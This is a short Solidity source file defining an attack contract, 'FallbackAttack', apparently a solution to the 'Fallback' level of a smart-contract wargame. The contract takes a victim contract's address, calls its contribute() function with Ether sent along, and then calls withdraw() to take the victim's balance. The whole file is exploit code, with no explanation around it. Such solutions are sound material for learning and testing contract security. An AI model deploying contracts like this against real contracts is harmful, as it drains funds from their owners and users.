pragma solidity ^0.8.11;

import "./Fallback.sol";

contract FallbackAttack {
    Fallback public _victim;

    constructor(address payable victim) public {
        _victim = Fallback(victim);
    }

    function attack() external payable returns (uint256) {
        (bool success, ) = address(_victim).call{value: msg.value, gas: 1000}(
            abi.encodeWithSignature("contribute()")
        );

        if (success) {
            _victim.withdraw();
        }

        return address(this).balance;
    }
}
